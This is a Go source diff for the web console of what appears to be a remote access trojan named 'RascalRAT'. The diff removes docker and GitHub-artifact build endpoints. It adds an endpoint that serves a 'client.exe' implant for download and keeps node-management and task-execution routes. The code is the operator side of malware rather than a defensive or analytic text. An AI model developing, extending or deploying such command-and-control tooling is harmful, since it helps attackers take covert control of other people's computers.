@@ -4,15 +4,11 @@ import (
 	"context"
 	"errors"
 	"fmt"
-	"html/template"
-	"io"
 	"net/http"
 	"os"
-	"os/exec"
 	"os/signal"
 	"path/filepath"
 	"strings"
-	"sync"
 	"syscall"
 	"time"
 
@@ -21,18 +17,10 @@ import (
 
 	"log/slog"
 
+	"github.com/joho/godotenv"
 	"github.com/labstack/echo/v5"
 	"github.com/labstack/echo/v5/middleware"
-	"github.com/joho/godotenv"
 )
-
-type TemplateRenderer struct {
-	templates *template.Template
-}
-
-func (r *TemplateRenderer) Render(c *echo.Context, w io.Writer, name string, data any) error {
-	return r.templates.ExecuteTemplate(w, name, data)
-}
 
 func main() {
 	godotenv.Load(".env")
@@ -45,7 +33,6 @@ func main() {
 	slog.SetDefault(logger)
 
 	e := echo.New()
-	e.Renderer = &TemplateRenderer{templates: template.Must(template.ParseGlob("templates/*.html"))}
 	e.Use(middleware.RequestLogger())
 	e.Use(middleware.Recover())
 
@@ -58,175 +45,35 @@ func main() {
 
 	hub := ws.NewHub()
 
-	// Build status tracking
-	var (
-		buildMutex     sync.Mutex
-		buildStatus    = "idle"
-		buildError     string
-		buildOutput    string
-		buildArtifact  string
-	)
-
 	initAuthRoutes(e)
 	applyAuthMiddleware(e)
 
 	// Operational REST Endpoints
+	e.GET("/assets/*file", echo.WrapHandler(http.StripPrefix("/assets/", http.FileServer(http.Dir("public")))))
 	e.GET("/", func(c *echo.Context) error {
-		return c.Render(http.StatusOK, "index.html", map[string]any{"Title": "RascalRAT Console"})
+		return c.File("public/index.html")
 	})
 	e.GET("/status", handleStatus)
 
-	// Build endpoints
-	e.POST("/build_docker", func(c *echo.Context) error {
-		buildMutex.Lock()
-		if buildStatus == "building" {
-			buildMutex.Unlock()
-			return c.JSON(http.StatusConflict, map[string]string{"error": "Build already in progress"})
-		}
-		buildStatus = "building"
-		buildError = ""
-		buildOutput = ""
-		buildArtifact = ""
-		buildMutex.Unlock()
-
-		go func() {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
-			defer cancel()
-
-			// Run docker build
-			cmd := exec.CommandContext(ctx, "docker", "build", "-t", "rascalrat-server", ".")
-			cmd.Dir, _ = os.Getwd()
-			out, err := cmd.CombinedOutput()
-			buildOutput = string(out)
-
-			buildMutex.Lock()
-			defer buildMutex.Unlock()
-
-			if err != nil {
-				buildStatus = "error"
-				buildError = fmt.Sprintf("Docker build failed: %v\n%s", err, buildOutput)
-				return
-			}
-
-			// Copy binary from container
-			artifactPath := filepath.Join("bin", "server")
-			cmd = exec.CommandContext(ctx, "docker", "create", "--name", "rascalrat-extract", "rascalrat-server")
-			cmd.Dir, _ = os.Getwd()
-			if out, err = cmd.CombinedOutput(); err != nil {
-				buildStatus = "error"
-				buildError = fmt.Sprintf("Container create failed: %v\n%s", err, string(out))
-				return
-			}
-
-			cmd = exec.CommandContext(ctx, "docker", "cp", "rascalrat-extract:/app/server", artifactPath)
-			if out, err = cmd.CombinedOutput(); err != nil {
-				buildStatus = "error"
-				buildError = fmt.Sprintf("Binary copy failed: %v\n%s", err, string(out))
-				exec.Command("docker", "rm", "-f", "rascalrat-extract").Run()
-				return
-			}
-
-			exec.Command("docker", "rm", "-f", "rascalrat-extract").Run()
-
-			buildArtifact = artifactPath
-			buildStatus = "done"
-		}()
-
-		return c.JSON(http.StatusAccepted, map[string]string{"status": "building", "message": "Docker build started"})
-	})
-
-	e.POST("/build_github", func(c *echo.Context) error {
-		var req struct {
-			RepoURL string `json:"repo_url"`
-		}
-		if err := c.Bind(&req); err != nil {
-			return c.JSON(http.StatusBadRequest, map[string]string{"error": "Invalid request"})
-		}
-
-		buildMutex.Lock()
-		if buildStatus == "building" {
-			buildMutex.Unlock()
-			return c.JSON(http.StatusConflict, map[string]string{"error": "Build already in progress"})
-		}
-		buildStatus = "building"
-		buildError = ""
-		buildOutput = ""
-		buildArtifact = ""
-		buildMutex.Unlock()
-
-		go func() {
-			repoURL := req.RepoURL
-			if repoURL == "" {
-				repoURL = "https://github.com/its-ernest/RascalRAT"
-			}
-
-			// Use nightly.link to get GitHub Actions artifact
-			ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
-			defer cancel()
-
-			// Try to download from nightly.link
-			artifactPath := filepath.Join("bin", "server")
-			cmd := exec.CommandContext(ctx, "curl", "-fL", "-o", artifactPath,
-				fmt.Sprintf("https://nightly.link/%s/workflows/build/main/server.zip", strings.TrimPrefix(repoURL, "https://github.com/")))
-			out, err := cmd.CombinedOutput()
-			buildOutput = string(out)
-
-			buildMutex.Lock()
-			defer buildMutex.Unlock()
-
-			if err != nil {
-				buildStatus = "error"
-				buildError = fmt.Sprintf("GitHub CI download failed: %v\n%s", err, buildOutput)
-				return
-			}
-
-			// Unzip if needed
-			if strings.HasSuffix(artifactPath, ".zip") {
-				cmd = exec.Command("unzip", "-o", artifactPath, "-d", filepath.Dir(artifactPath))
-				if out, err = cmd.CombinedOutput(); err != nil {
-					buildStatus = "error"
-					buildError = fmt.Sprintf("Unzip failed: %v\n%s", err, string(out))
-					return
-				}
-			}
-
-			buildArtifact = "bin/server"
-			buildStatus = "done"
-		}()
-
-		return c.JSON(http.StatusAccepted, map[string]string{"status": "building", "message": "GitHub CI build started"})
-	})
+	// Build endpoints removed - client is built during docker build when BUILD_CLIENT=1
 
 	e.GET("/build_status", func(c *echo.Context) error {
-		buildMutex.Lock()
-		defer buildMutex.Unlock()
-
 		resp := map[string]string{
-			"status":  buildStatus,
-			"error":   buildError,
-			"output":  buildOutput,
-		}
-		if buildArtifact != "" {
-			resp["artifact"] = buildArtifact
+			"status": "idle",
+			"error":  "",
+			"output": "Build endpoints removed. Client is built during docker build when BUILD_CLIENT=1.",
 		}
 		return c.JSON(http.StatusOK, resp)
 	})
 
-	e.GET("/download_server", func(c *echo.Context) error {
-		buildMutex.Lock()
-		artifact := buildArtifact
-		buildMutex.Unlock()
-
-		if artifact == "" || !filepath.IsAbs(artifact) {
-			// Try relative path
-			artifact = filepath.Join("bin", "server")
-		}
+	e.GET("/download_client", func(c *echo.Context) error {
+		artifact := filepath.Join("bin", "client.exe")
 
 		if _, err := os.Stat(artifact); os.IsNotExist(err) {
-			return c.JSON(http.StatusNotFound, map[string]string{"error": "Server binary not found. Run a build first."})
+			return c.JSON(http.StatusNotFound, map[string]string{"error": "Client binary not found. Build the Docker image with BUILD_CLIENT=1 to include client.exe."})
 		}
 
-		return c.Attachment(artifact, "rascalrat-server")
+		return c.Attachment(artifact, "client.exe")
 	})
 
 	// Node Management and Task Execution Endpoints
